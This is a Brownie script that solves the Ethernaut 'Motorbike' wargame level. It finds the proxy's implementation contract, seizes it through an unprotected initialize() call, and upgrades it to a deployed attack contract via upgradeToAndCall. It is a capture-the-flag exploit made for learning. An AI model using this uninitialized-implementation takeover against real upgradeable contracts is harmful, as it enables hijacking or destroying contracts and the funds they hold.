from brownie import web3, Motorbike, Engine, MotorbikeAttack
from eth_utils import function_signature_to_4byte_selector

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "25_motorbike"
INTERFACE_CONTRACT = Motorbike
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")

# blog post with explanation on how to solve the level
# https://medium.com/@appsbylamby/ethernaut-25-motorbikewalkthrough-3e1feeee6a4c


def solve_level(level_contract):
    implementation_slot = (
        0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC
    )
    account = get_account()
    storage_slot = web3.eth.get_storage_at(level_contract.address, implementation_slot)
    imp_address = web3.toHex(storage_slot)
    engine = Engine.at(imp_address)
    print("Implementation contract > " + imp_address)
    print("Upgrader " + engine.upgrader())
    print("Horse power " + str(engine.horsePower()))

    engine.initialize({"from": account})
    print("--- Afther initialize ---")
    print("Upgrader " + engine.upgrader())
    print("Horse power " + str(engine.horsePower()))

    motorbike_attack = MotorbikeAttack.deploy({"from": account})
    four_byte_signature = "0x" + function_signature_to_4byte_selector("attack()").hex()
    engine.upgradeToAndCall(
        motorbike_attack.address, four_byte_signature, {"from": account}
    )


# brownie run scripts/_25_motorbike.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
